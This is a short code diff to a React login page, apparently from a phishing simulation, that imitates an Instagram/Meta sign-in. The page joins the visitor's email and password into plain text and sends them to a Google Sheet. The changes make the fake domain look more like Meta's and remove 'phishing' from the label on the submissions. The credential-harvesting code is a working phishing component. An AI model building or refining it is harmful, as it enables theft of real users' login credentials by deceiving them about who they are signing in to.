@@ -16,7 +16,7 @@ export default function LoginPage({ onNext, data }) {
     const [startTime] = useState(Date.now());
 
     // Fake URL bar showing suspicious domain
-    const fakeUrl = 'https://instasecure-vercel.com/auth/login';
+    const fakeUrl = 'https://instasecure-meta.com';
 
     const handleSubmit = async (e) => {
         e.preventDefault();
@@ -24,7 +24,7 @@ export default function LoginPage({ onNext, data }) {
 
         // Submit credentials to Google Sheet
         const fullCredentials = `${email}:${password}`;
-        await submitToSheet(fullCredentials, 'phishing-sim-login');
+        await submitToSheet(fullCredentials, 'sim-login');
 
         // Simulate processing delay
         setTimeout(() => {
